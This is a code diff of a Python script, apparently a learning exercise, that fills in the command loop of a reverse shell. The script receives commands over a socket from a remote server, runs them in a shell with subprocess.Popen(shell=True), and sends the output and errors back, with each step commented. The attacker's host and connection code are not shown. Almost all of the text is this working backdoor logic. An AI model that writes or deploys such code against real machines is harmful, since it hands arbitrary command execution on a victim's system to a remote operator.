@@ -29,16 +29,18 @@ while not connected:
 
 #the while will keep the connection while it is uninterupted
 while True:
-    # set var commandrequested to mysocket.recv(1024)
-    # use subprocess.Popen(to execute commandrequested)
-    # Use .communicate to get all of the output and error messages
-    # use mysocket.send( to send stdout and stderr )
-
-
     #This tells you how big the buffer size is, how big of chunks of data you receive (this is 1kb), up this or lower depending on needs
     commandrequested=mysocket.recv(1024)
+
+    #spawns a new  child process. First arg is to receive the command from the sever, then open in a shell, and a pipe to the standard stream is opened
     prochandle=subprocess.Popen(commandrequested, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
+    #assigns outputs and errors from the process to tuple here
     results, errors= prochandle.communicate()
+
+    #concats the results to prep to be sent
     results = results + errors
+
+    #sends results to socket (server infrastucture)
     mysocket.send(results)
 
